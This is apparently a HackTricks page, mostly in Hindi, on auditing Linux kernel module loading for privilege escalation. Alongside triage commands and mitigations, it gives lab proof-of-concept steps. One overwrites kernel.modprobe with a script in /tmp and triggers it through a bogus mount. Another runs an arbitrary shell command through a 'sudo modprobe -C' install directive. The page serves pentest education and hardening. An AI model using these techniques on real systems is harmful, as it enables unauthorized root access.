# Kernel Modules और modprobe Abuse

{{#include ../../banners/hacktricks-training.md}}

## Kernel module और module-loading misconfigurations

Linux privilege escalation review के दौरान Kernel module support एक high-impact क्षेत्र है। हर unsigned-module message को अपने-आप exploitable न मानें, बल्कि इन practical questions के उत्तर पाने के लिए इसका उपयोग करें।<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[8]](#references)[[9]](#references)[[10]](#references)</sup>

- क्या current user `sudo`, capabilities या किसी writable helper path के माध्यम से modules load कर सकता है?
- क्या module loading अभी भी enabled है?
- क्या module signature enforcement disabled है?
- क्या module directories, module files या `modprobe.d` configuration paths writable हैं?<sup>[[16]](#references)</sup>
- क्या यह confirm करने के लिए kernel logs पढ़े जा सकते हैं कि क्या हुआ?

Quick triage निम्नलिखित module-status, signature, logging और module-tree checks से शुरू होती है।<sup>[[1]](#references)[[2]](#references)[[6]](#references)[[8]](#references)</sup>
```bash
uname -a
uname -r
cat /proc/sys/kernel/modules_disabled 2>/dev/null
grep -Eo '(^| )module\.sig_enforce(=[^ ]*)?' /proc/cmdline 2>/dev/null
grep -E '^(CONFIG_STATIC_USERMODEHELPER|CONFIG_STATIC_USERMODEHELPER_PATH)=' "/boot/config-$(uname -r)" 2>/dev/null
grep -E '^(CONFIG_MODULE_SIG|CONFIG_MODULE_SIG_FORCE)=' "/boot/config-$(uname -r)" 2>/dev/null
cat /proc/sys/kernel/dmesg_restrict 2>/dev/null
dmesg 2>/dev/null | grep -Ei 'module|signature|taint|verification'
find /lib/modules/$(uname -r) -type d -writable -ls 2>/dev/null
find /lib/modules/$(uname -r) -type f -name '*.ko*' -writable -ls 2>/dev/null
```
व्याख्या:

- `modules_disabled=1` का अर्थ है कि modules को न तो load किया जा सकता है और न ही unload, और reboot होने तक इसका मान `0` पर reset नहीं किया जा सकता।<sup>[[1]](#references)</sup>
- kernel command line पर `module.sig_enforce=1` या `CONFIG_MODULE_SIG_FORCE=y` के लिए valid रूप से signed modules आवश्यक होते हैं; अन्यथा unsigned modules load हो सकते हैं और kernel को taint कर सकते हैं।<sup>[[2]](#references)</sup>
- `dmesg_restrict=0` `dmesg` पर कोई restriction लागू नहीं करता; जब यह `1` होता है, तो access के लिए `CAP_SYSLOG` आवश्यक होता है।<sup>[[1]](#references)</sup>
- `/lib/modules/$(uname -r)/` के अंतर्गत writable paths खतरनाक होते हैं, क्योंकि modules load करते समय `modprobe` इस tree और इसके dependency data में search करता है।<sup>[[8]](#references)</sup>

### Module load करना और kernel output पढ़ना

यदि आपके पास किसी local module को load करने की legitimate permission है, तो `insmod` आपके द्वारा दिए गए exact `.ko` file को insert करता है। Module का init function load के हिस्से के रूप में run होता है, और `printk()` से लिखे गए messages kernel log buffer में जाते हैं, जिसे सामान्यतः `dmesg` से पढ़ा जाता है।<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)</sup>

एक minimal review workflow metadata inspect करने के लिए `modinfo`, module को load और remove करने के लिए `insmod` और `rmmod`, loaded state की पुष्टि करने के लिए `lsmod`, और kernel logs inspect करने के लिए `dmesg` का उपयोग करता है।<sup>[[4]](#references)[[6]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>
```bash
ls -l ./example.ko
modinfo ./example.ko 2>/dev/null
sudo insmod ./example.ko
lsmod | grep -i example
dmesg | tail -n 30
sudo rmmod example
dmesg | tail -n 30
```
यदि `sudo -l` `insmod`, `modprobe`, या इनके आसपास के किसी wrapper को अनुमति देता है, तो इसे क्रिटिकल मानें: `sudo -l` चलाने वाले user के privileges सूचीबद्ध करता है, और kernel module लोड करने के लिए `CAP_SYS_MODULE` आवश्यक होता है। सीधे capability-based paths के लिए [Linux capabilities](../interesting-files-permissions/linux-capabilities.md#cap_sys_module) देखें।<sup>[[3]](#references)[[9]](#references)[[10]](#references)</sup>
```bash
sudo -l
sudo /sbin/insmod ./example.ko
```
### Sudo से अनुमत `insmod`

ऐसा sudo rule जो किसी user को `insmod` चलाने की अनुमति देता है, किसी सामान्य administrative helper की अनुमति देने के बराबर नहीं है। Module का initialization code insertion के हिस्से के रूप में चलता है, इसलिए practical review का प्रश्न यह है कि क्या यह user load किए जा रहे module को चुन या modify कर सकता है।<sup>[[3]](#references)</sup>

निम्न generic review flow candidate module के लिए inspection, load, state, log और removal checks को दोहराता है।<sup>[[4]](#references)[[6]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>
```bash
sudo -l
ls -l ./candidate.ko
modinfo ./candidate.ko 2>/dev/null
sudo /sbin/insmod ./candidate.ko
lsmod | grep -i candidate
dmesg | tail -n 30
sudo /sbin/rmmod candidate
```
यदि user कोई मनमाना `.ko` प्रदान कर सकता है, तो authorized assessment में इस rule को full system compromise माना जाना चाहिए। अधिक सुरक्षित operational pattern यह है कि sudo के माध्यम से module loading delegate न किया जाए; यदि यह अपरिहार्य हो, तो exact path, ownership, permissions, signing policy और removal workflow को restrict करें।<sup>[[3]](#references)[[10]](#references)</sup>

Controlled lab में harmless module-building pattern के लिए, minimal source और Makefile नीचे दिखाए गए हैं; `make -C /lib/modules/$(uname -r)/build M=$PWD` form external modules के लिए kernel के documented kbuild workflow का अनुसरण करता है।<sup>[[5]](#references)[[7]](#references)</sup>
```c
#include <linux/module.h>
#include <linux/kernel.h>

static int __init demo_init(void) {
printk(KERN_INFO "demo module loaded\n");
return 0;
}

static void __exit demo_exit(void) {
printk(KERN_INFO "demo module unloaded\n");
}

module_init(demo_init);
module_exit(demo_exit);
MODULE_LICENSE("GPL");
```

```makefile
obj-m += demo.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
केवल अधिकृत lab में build और load करें; kbuild external module को build करता है और load/remove commands kernel module interfaces को invoke करती हैं।<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[7]](#references)</sup>
```bash
make
sudo insmod demo.ko
dmesg | tail -n 20
sudo rmmod demo
```
### `kernel.modprobe` / `modprobe_path` के दुरुपयोग की जाँच

`kernel.modprobe` उस userspace helper का नाम बताता है जिसे kernel module autoload requests के लिए execute करता है; यह sysctl autoloading को प्रभावित करता है, explicit module insertion को नहीं। यदि कोई attacker इसे किसी writable executable path में बदल सकता है और module request trigger कर सकता है, तो वह helper privileged code-execution path बन जाता है। इसे empty string पर सेट करने से autoload requests disable हो जाती हैं; यदि `CONFIG_STATIC_USERMODEHELPER=y` है, तो non-empty value compiled-in static helper path से override हो जाती है।<sup>[[1]](#references)</sup>

वर्तमान helper path को kernel sysctl interface के माध्यम से जाँचें और target के ownership तथा mode का निरीक्षण करें।<sup>[[1]](#references)</sup>
```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
sysctl kernel.modprobe 2>/dev/null
ls -l "$(cat /proc/sys/kernel/modprobe 2>/dev/null)" 2>/dev/null
```
जाँचें कि sysctl, delegated sudo नियमों या file capabilities को प्रभावित किया जा सकता है या नहीं।<sup>[[1]](#references)[[9]](#references)[[10]](#references)[[15]](#references)</sup>
```bash
ls -l /proc/sys/kernel/modprobe
sudo -l | grep -E 'sysctl|tee|bash|sh|modprobe'
getcap -r / 2>/dev/null | grep -E 'cap_sys_admin|cap_sys_module'
```
निम्न lab-only pattern helper path को बदलता है और documented module-autoload request को trigger करता है; इसका उपयोग केवल isolated, authorized system पर करें।<sup>[[1]](#references)</sup>

वर्तमान Linux kernels पर generic trigger के रूप में किसी unknown executable का उपयोग न करें: legacy custom binary-format module autoloading को Linux 6.14 में हटा दिया गया है, जबकि kernel documentation unknown filesystem type को module-autoload request path के रूप में पहचानता है।<sup>[[1]](#references)[[11]](#references)</sup>
```bash
# Example only: requires permission to write kernel.modprobe
printf '#!/bin/sh\nid > /tmp/modprobe-helper-ran\n' > /tmp/helper
chmod +x /tmp/helper
echo /tmp/helper | sudo tee /proc/sys/kernel/modprobe

# Trigger a documented module-autoload request (requires mount privilege)
sudo mount -t definitely-not-a-filesystem none /mnt 2>/dev/null || true
cat /tmp/modprobe-helper-ran 2>/dev/null
```
सख्त सुरक्षा वाले सिस्टम पर, यह तब विफल होना चाहिए जब permissions अनधिकृत users को `kernel.modprobe` में लिखने से रोकती हों, helper path writable न हो, या module autoloading disabled हो।<sup>[[1]](#references)</sup>

### Writable `modprobe.d` configuration और `sudo modprobe -C`

किसी module को resolve करने से पहले, `modprobe` precedence order में `/etc/modprobe.d`, `/run/modprobe.d`, `/usr/local/lib/modprobe.d`, `/usr/lib/modprobe.d` और `/lib/modprobe.d` जैसी configuration directories से `.conf` files पढ़ता है। उच्च-priority directory में मौजूद समान नाम वाली file, lower-priority file को shadow करती है। इससे भी महत्वपूर्ण बात यह है कि `install <module> <command>` directive उस module को insert करने के बजाय arbitrary shell command चलाती है। इसलिए, writable configuration path, बाद में privileged `modprobe` caller के credentials के तहत delayed command execution का माध्यम बन सकता है; kernel module signature enforcement इस userspace command को authenticate नहीं करता।<sup>[[16]](#references)</sup>

Directory और file permissions का audit करें, फिर effective configuration का निरीक्षण करें। `modprobe -n -v` resolution review के लिए safe है, क्योंकि dry-run mode न तो module insert करता है और न ही `install`/`remove` command execute करता है। पुराने `--showconfig` spelling के बजाय `modprobe -c` को प्राथमिकता दें, जिसे वर्तमान kmod documentation kmod 36 के बाद हटाए जाने के लिए चिह्नित करती है।<sup>[[8]](#references)[[16]](#references)</sup>
```bash
for d in /etc/modprobe.d /run/modprobe.d /usr/local/lib/modprobe.d /usr/lib/modprobe.d /lib/modprobe.d; do
[ -e "$d" ] || continue
find "$d" -maxdepth 1 -writable -ls 2>/dev/null
done

grep -RHE '^[[:space:]]*(install|remove|alias|blacklist)[[:space:]]' \
/etc/modprobe.d /run/modprobe.d /usr/local/lib/modprobe.d \
/usr/lib/modprobe.d /lib/modprobe.d 2>/dev/null
modprobe -c 2>/dev/null | grep -E '^(install|remove|alias|blacklist)[[:space:]]'
modprobe -n -v <module_name>
```
`modprobe` के लिए unrestricted sudo rule तब भी exploitable होता है, जब arbitrary `.ko` files signature verification पास न कर सकें: `-C` attacker-controlled configuration directory चुनता है, जहाँ से sudo द्वारा launch किए गए process द्वारा एक `install` command execute की जा सकती है।<sup>[[8]](#references)[[16]](#references)</sup>
```bash
# Authorized lab proof for an unrestricted `sudo modprobe` rule
D="$(mktemp -d)"
printf '%s\n' 'install ht_probe /bin/sh -c "id > /tmp/ht-modprobe-id"' > "$D/00-ht.conf"
sudo /sbin/modprobe -C "$D" ht_probe
cat /tmp/ht-modprobe-id
```
Mitigation के लिए, sudo के माध्यम से argument-unrestricted `modprobe` प्रदान न करें, हर configuration directory को root-owned और non-writable रखें, और अनपेक्षित `install`/`remove` directives की समीक्षा करें। जब किसी trusted administrative workflow को एक module के लिए ऐसी directives को bypass करना आवश्यक हो, तो `modprobe --ignore-install` उस नामित module के लिए उन्हें अनदेखा करता है, लेकिन dependencies में अपने commands हो सकते हैं।<sup>[[8]](#references)[[16]](#references)</sup>

### Writable `/lib/modules` की समीक्षा

Writable module directories, module replacement, malicious module planting या auto-load abuse की अनुमति दे सकती हैं, यह इस बात पर निर्भर करता है कि `modprobe` को बाद में कैसे invoke किया जाता है; `modprobe` `/lib/modules/$(uname -r)` में खोज करता है और modules को resolve करते समय उसके dependency data का उपयोग करता है।<sup>[[8]](#references)</sup>

Active kernel release के module tree के अंतर्गत writable module files और dependency/alias metadata की समीक्षा करें।<sup>[[8]](#references)</sup>
```bash
KREL="$(uname -r)"
find "/lib/modules/$KREL" -type d -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f -name '*.ko*' -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f \( -name 'modules.dep' -o -name 'modules.alias' -o -name 'modules.order' \) -writable -ls 2>/dev/null
```
यदि आपको लिखने योग्य मॉड्यूल सामग्री मिलती है, तो जाँचें कि `modprobe` dependencies को कैसे resolve करता है और `modinfo` मॉड्यूल metadata की रिपोर्ट कैसे करता है।<sup>[[8]](#references)[[12]](#references)</sup>
```bash
modprobe --show-depends <module_name> 2>/dev/null
modinfo <module_name> 2>/dev/null
grep -R "<module_name>" /lib/modules/$(uname -r)/modules.* 2>/dev/null
```
रक्षात्मक नोट्स:

- `/lib/modules` का स्वामित्व `root:root` के पास रखें और इसे users द्वारा writable न होने दें।<sup>[[8]](#references)</sup>
- जहाँ operational रूप से संभव हो, boot के बाद `kernel.modules_disabled=1` सेट करें।<sup>[[1]](#references)</sup>
- उन systems पर module signing लागू करें जिनमें loadable modules की आवश्यकता होती है।<sup>[[2]](#references)</sup>
- `/proc/sys/kernel/modprobe`, `/lib/modules`, और `modprobe.d` configuration directories में होने वाले writes के साथ-साथ unexpected `insmod`/`modprobe` execution को monitor करें।<sup>[[1]](#references)[[8]](#references)[[16]](#references)</sup>



## References

- [1] [/proc/sys/kernel/ के लिए Documentation — The Linux Kernel documentation](https://docs.kernel.org/admin-guide/sysctl/kernel.html)
- [2] [Kernel module signing facility — The Linux Kernel documentation](https://www.kernel.org/doc/html/latest/admin-guide/module-signing.html)
- [3] [init_module(2) — Linux manual page](https://man7.org/linux/man-pages/man2/init_module.2.html)
- [4] [insmod(8) — Linux manual page](https://man7.org/linux/man-pages/man8/insmod.8.html)
- [5] [Driver Basics — The Linux Kernel documentation](https://docs.kernel.org/driver-api/basics.html)
- [6] [printk के साथ Message logging — The Linux Kernel documentation](https://docs.kernel.org/core-api/printk-basics.html)
- [7] [Building External Modules — The Linux Kernel documentation](https://docs.kernel.org/kbuild/modules.html)
- [8] [modprobe(8) — Linux manual page](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [9] [sudo(8) — Linux manual page](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [10] [capabilities(7) — Linux manual page](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [11] [Merge tag 'execve-v6.14-rc1' — torvalds/linux](https://github.com/torvalds/linux/commit/fadc3ed9ce1cd9ecc5c8be8875f7ec11ab3a7ebe)
- [12] [modinfo(8) — Linux manual page](https://man7.org/linux/man-pages/man8/modinfo.8.html)
- [13] [lsmod(8) — Linux manual page](https://man7.org/linux/man-pages/man8/lsmod.8.html)
- [14] [rmmod(8) — Linux manual page](https://man7.org/linux/man-pages/man8/rmmod.8.html)
- [15] [getcap(8) — Linux manual page](https://man7.org/linux/man-pages/man8/getcap.8.html)
- [16] [modprobe.d(5) — Linux manual page](https://man7.org/linux/man-pages/man5/modprobe.d.5.html)
{{#include ../../banners/hacktricks-training.md}}
